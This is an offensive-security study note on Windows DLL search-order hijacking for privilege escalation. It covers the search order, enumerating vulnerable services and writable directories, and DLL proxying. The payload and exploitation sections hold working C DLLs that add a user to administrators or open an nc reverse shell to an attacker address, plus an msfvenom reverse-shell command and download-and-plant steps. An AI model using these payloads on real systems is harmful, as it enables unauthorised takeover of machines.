---
created: 2026-08-23
updated: 2026-09-20
aliases:
  - DLL hijacking
tags:
  - Windows
  - Windows_PrivEsc
status: incomplete
---
## DLL search-order hijacking

>[!abstract] **Scope**: Identifying and exploiting insecure Windows DLL search-order behavior to achieve local privilege escalation.

- [ ] Identify target services or applications running as `SYSTEM` (or other privileged accounts) that load DLLs without fully qualified paths.
- [ ] Use Process Monitor to filter for `NAME NOT FOUND` results on DLL load operations to identify phantom DLLs.
- [ ] Check whether the candidate DLL is protected by `KnownDLLs` (these can't be hijacked).
- [ ] Check whether your current user has write permissions on a directory in the DLL search order. 
- [ ] Generate a custom DLL payload (match the payload architecture to the target process).
- [ ] Place the DLL in the highest-priority writable directory in the DLL search order.
- [ ] Trigger the application or service and verify that the DLL is loaded.
- [ ] Verify elevated access.

## DLLs and search order

>A **DLL (Dynamic-Link Library)** is a shared library file format (`.dll`) used on Windows. These libraries contain compiled code, functions, and data that can be used by multiple programs simultaneously. 

- Unlike static libraries which are embedded into an executable at compile time, DLLs are linked to applications **dynamically at runtime**.
---

- A program may load a DLL by specifying either its **fully qualified path** (e.g., `C:\Program Files\Example\support.dll`) or **module name only** (e.g., `support.dll`).
- If a full path is specified, Windows normally loads the exact file.
- If a program specifies a DLL only by its name, Windows searches several predefined locations in order. 
- The exact search order depends on the application and loader configuration; below is the standard order for an unpackaged desktop application when safe DLL search mode is enabled:

| Order     | Resolution mechanism                                        |
| --------- | ----------------------------------------------------------- |
| `1`       | DLL redirection.                                            |
| `2`       | API sets.                                                   |
| `3`       | Side-by-side (SxS) manifest redirection.                    |
| `4`       | Loaded-module list.                                         |
| `5`       | `KnownDLLs`.                                                |
| `6`       | Package dependency graph (Windows 11 `21H2` and later).     |
| **Order** | **Location**                                                |
| `7`       | The directory from which the application was loaded.        |
| `8`       | The system directory (normally `C:\Windows\System32`).      |
| `9`       | The 16-bit system directory (normally `C:\Windows\System`). |
| `10`      | The Windows directory (normally `C:\Windows`).              |
| `11`      | The current working directory of the process.               |
| `12`      | Directories listed in the `PATH` environment variable.      |
>[!note] See [`Dynamic-link library search order — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order).

### Safe DLL search mode

- **Safe DLL search mode** is **enabled by default**. It moves the process's current directory later in the search order. 

- If safe DLL search mode is *disabled* the search order is the same except that _the current folder_ moves from position `11` to position `8` in the sequence (immediately after step `7`. The folder from which the application loaded).

- The safe DLL search mode is diabled if the following registry value exists and is set to `0`:

```powershell
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode
```

>[!note] The application can modify this order with APIs such as `SetDllDirectory`, `AddDllDirectory`, `SetDefaultDllDirectories`, or `LoadLibraryEx` flags.

### `KnownDLLs` protection

- Windows maintains a pre-loaded set of critical system DLLs in the `KnownDLLs` registry key. It is located at `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.

```powershell
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs'
```

- DLLs listed in `KnownDLLs` are loaded exclusively from `System32` and bypass the standard search order. These can't be replaced through DLL search-order hijacking. 
- Common examples of protected DLLs include `kernel32.dll`, `ntdll.dll`, `advapi32.dll`, `ole32.dll`, `shell32.dll`, and `ws2_32.dll`.
## Privilege escalation through DLL search-order hijacking

- **DLL hijacking** occurs when a user can place a DLL with the same name as the requested one in a location that Windows searches before the legitimate DLL. 
- A DLL loaded by a service running as `SYSTEM`, for example, executes in that highly privileged context.

---
- Conditions for privilege escalation via DLL hijacking:
	- The target process loads a DLL by name, without specifying its fully qualified path.
	- Your current user can create or replace the expected DLL In a searched directory.
	- That directory is searched before the legitimate location.
	- The requested DLL i snot resoled earlier through mechanism like DLL redirection, API sets, side-by-side manifests, the loaded-module list, or `KnownDLLs`.
	- The process that loads the DLL can be triggered by your current user, starts automatically, or will predictably restart.
	- The target process runs with privileges higher than that of your current user.

## Enumerating DLL hijacking opportunities 

### Identifying privileged services

- Enumerate all Windows services and display key configuration properties:

```powershell
Get-CimInstance -ClassName Win32_Service | Select-Object Name, DisplayName, State, StartMode, PathName, StartName | Format-Table -AutoSize
```

>[!tip] Look for services executed as `SYSTEM` or another high-privileged account.

- Filter for services running as `SYSTEM` and located outside the `C:\Windows` directory:

```powershell
Get-CimInstance -ClassName Win32_Service | Where-Object { $_.StartName -eq 'LocalSystem' -and $_.PathName -notlike 'C:\Windows*' } | Format-Table Name, PathName, StartMode -AutoSize
```

- Display configuration of a specific service:

```powershell
sc.exe qc WindscribeService
```

>[!note] See [[Weak service DACLs#Enumerating system services and permissions]].

### Capturing phantom DLL files with process monitor

- **Phantom DLLs** (also known as missing DLLs) are DLLs that a process attempts to load but can't find in any of the searched locations. 
- These are ideal candidates for DLL hijacking because placing your DLL at **any** writable search-order location will cause it to load.

---

- If you have enough permissions, you can use [`Process Monitor`](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) (from the Sysinternals suite) to identify phantom DLLs.
- Start the tool, clear existing events, then add the following filters:
	- `Process Name` is the target executable name — `Include`.
	- `Path` ends with `.dll` -> `Include`.
	- `Operation` is `CreateFile` -> `Include`.
	- `Operation` is `Load Image` -> `Include`.
- Restart the target service or application, then search for:
	- `NAME NOT FOUND` events for missing DLL candidates.
	- Successful `Load Image` events to learn which file ultimately loaded.
	- The sequence of attempted paths for the same DLL name.

>[!note] Entries with `NAME NOT FOUND` indicate DLLs that the process attempted to load but couldn't find.

>[!tip]+
> - Export the Process Monitor results to CSV for offline analysis:
> 	- **`File`** → **`Save`** → `Format: CSV`
> - Filter the CSV for failed DLL lookup errors:
> ```powershell
> Import-Csv .\procmon_log.csv | Where-Object { $_.Result -eq 'NAME NOT FOUND' -and $_.Path -like '*.dll' } | Select-Object 'Process Name', Path | Sort-Object Path -Unique
> ```

### Inspecting directory permissions

- For every candidate path, check permissions on the exact directory:

```powershell
icacls 'C:\Program Files\Example App'
```

- Look for effective permissions that allow your current user or a group to which the user belongs (such as `BUILTIN\Users`, `Everyone`, `Authenticated Users`), to create or modify the relevant DLL, such as `(W)` (write), `(M)` (modify), or `(F)` (full control).

>[!tip]+ Also determine whether an existing DLL can be replaced. File permissions may differ from the parent directory's permissions.
## Compiling a payload DLL

- Minimal C payload DLL that executes a command when loaded by any process:

```c
#include <windows.h>
#include <stdlib.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /c net localgroup administrators jdoe /add");
    }
    return TRUE;
}
```

- Minimal C payload DLL that spawns a reverse shell:

```c
#include <windows.h>
#include <stdlib.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /c C:\\Temp\\nc.exe -e cmd.exe <attacker_ip_address> 443");
    }
    return TRUE;
}
```

- Cross-compile the DLL on Linux using MinGW:

```bash
x86_64-w64-mingw32-gcc -shared -o hijack.dll hijack.c
```

- Compile a 32-bit DLL (if the target process is 32-bit):

```bash
i686-w64-mingw32-gcc -shared -o hijack.dll hijack.c
```

>[!important] Match the DLL architecture (32-bit vs 64-bit) to the target process. A 64-bit process can't load a 32-bit DLL and vice versa.

- Generate a DLL payload using `msfvenom`:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip_address> LPORT=443 -f dll -o hijack.dll
```

### DLL proxying

- In some cases, the target process depends on functions exported by the legitimate DLL. If you replace the DLL entirely and it doesn't define the expected functions, the application may crash before your payload executes.
- To solve this, you can make your payload DLL forward all legitimate function calls to the original DLL. This is called **DLL proxying** or **DLL forwarding**.

---

- To use this technique, first enumerate exports from the original DLL using [`dumpbin`](https://learn.microsoft.com/en-us/cpp/build/reference/dumpbin-reference?view=msvc-170) or [`SharpDllProxy`](https://github.com/Flangvik/SharpDllProxy):

```powershell
dumpbin /exports C:\Windows\System32\original.dll
```

- Then gerenate a proxy DLL that forwards exports.
- Tools like [`SharpDllProxy`](https://github.com/Flangvik/SharpDllProxy) automate this process by generating a C source file with `#pragma comment(linker, "/export:...")` directives for every exported function.

>[!note] DLL proxying is required only when the loading process calls specific functions from the hijacked DLL. For phantom DLLs (which don't exist on disk at all), a simple `DllMain`-only payload is sufficient.

## Exploitation

- Transfer the malicious DLL to the target system (see [[🛠️ Windows file transfers]]):

```bash
python3 -m http.server 8080
```

```powershell
Invoke-WebRequest -Uri 'http://<attacker_ip_address>:8080/hijack.dll' -OutFile 'C:\Temp\hijack.dll'
```

- Then copy the DLL to the writable directory using the expected filename:

```powershell
copy C:\Temp\hijack.dll 'C:\Program Files\VulnApp\wlbsctrl.dll'
```

- Restart the service or application to trigger DLL loading:

```powershell
sc.exe stop IKEEXT
```

```powershell
sc.exe start IKEEXT
```

>[!tip]+
> - Confirm elevated access:
> ```powershell
> net localgroup administrators
> ```
> ```powershell
> whoami /priv
> ```

>[!tip]+
> - Remove the planted DLL after achieving elevated access:
> ```powershell
> del 'C:\Program Files\VulnApp\wlbsctrl.dll'
> ```
> - Restart the service to restore normal operation:
> ```powershell
> sc.exe stop IKEEXT
> ```
> ```powershell
> sc.exe start IKEEXT
> ```

## Exploiting writable directories in `PATH`

- When an application or service loads a DLL without specifying its fully qualified path and the DLL does not exist in earlier search-order locations, Windows falls back to searching directories listed in the `PATH` environment variable (step `12` in the search order).
- If your account has write access to any directory in the system `PATH` that precedes the directory containing the legitimate library, or if the DLL is missing entirely (phantom DLL), you can plant a payload DLL in that writable directory to achieve code execution when the privileged process starts or restarts.

- Find writable directories specified in the `PATH` environment variable using [`SharpUp`](https://github.com/GhostPack/SharpUp/):

```powershell
.\SharpUp.exe audit
```

| Flag | Parameter | Description |
| :--- | :--- | :--- |
| `audit` | None | Runs all privilege escalation checks, including modifiable `PATH` directories. |

- Check permissions across all directories in the `PATH` environment variable using PowerShell and `icacls`:

```powershell
$env:PATH -split ';' | ForEach-Object { icacls $_.Trim() 2>$null | Select-String "(F)|(M)|(W)" }
```

- Audit user-writable directories in `PATH` by identifying full control (`F`), modify (`M`), or write (`W`) permissions granted to `BUILTIN\Users`, `Everyone`, or `Authenticated Users`:

```powershell
$paths = $env:PATH -split ';'
foreach ($p in $paths) {
	$acl = icacls $p.Trim() 2>$null
	if ($acl -match "(BUILTIN\\Users|Everyone|Authenticated Users).*\((F|M|W)\)") {
		Write-Host "[WRITABLE] $p" -ForegroundColor Red
	}
}
```

- Monitor service DLL loading failures using [`Process Monitor`](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) to identify missing DLL candidates:
	- Filter for `Result` is `NAME NOT FOUND` and `Path` ends with `.dll`.
	- Identify DLLs that the privileged process attempts to load from directories in `PATH`.

- Copy your payload DLL to the identified writable `PATH` directory using the expected DLL filename:

```powershell
copy /Y C:\Temp\hijack.dll "C:\Users\jdoe\tools\missing.dll"
```

| Flag | Parameter | Description |
| :--- | :--- | :--- |
| `/Y` | None | Suppresses prompting to confirm overwriting an existing destination file. |

- Restart the target service to trigger the DLL load:

```powershell
sc.exe stop VulnService
```

```powershell
sc.exe start VulnService
```

>[!tip]+
> - Verify elevated access after triggering the service:
> ```powershell
> net localgroup administrators
> ```
> ```powershell
> whoami /priv
> ```

>[!tip]+
> - Remove the planted DLL from the `PATH` directory:
> ```powershell
> del "C:\Users\jdoe\tools\missing.dll"
> ```
> - Restart the service to restore normal operation:
> ```powershell
> sc.exe start VulnService
> ```

## References and further reading

- [`DLL Hijacking — Windows Privilege Escalation — Juggernaut Pentesting Academy`](https://juggernaut-sec.com/dll-hijacking/)
- [`Dynamic-link library search order — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [`LoadLibraryW — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibraryw)
- [`KnownDLLs — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-security)
- [`Process Monitor — Microsoft Sysinternals`](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [`SharpDllProxy — GitHub`](https://github.com/Flangvik/SharpDllProxy)
- [`SharpUp — GitHub`](https://github.com/GhostPack/SharpUp/)
- [`DLL Hijacking — Internal All The Things`](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#eop-dll-hijacking)
- [`Hijack Execution Flow: DLL Search Order Hijacking — MITRE ATT&CK T1574.001`](https://attack.mitre.org/techniques/T1574/001/)
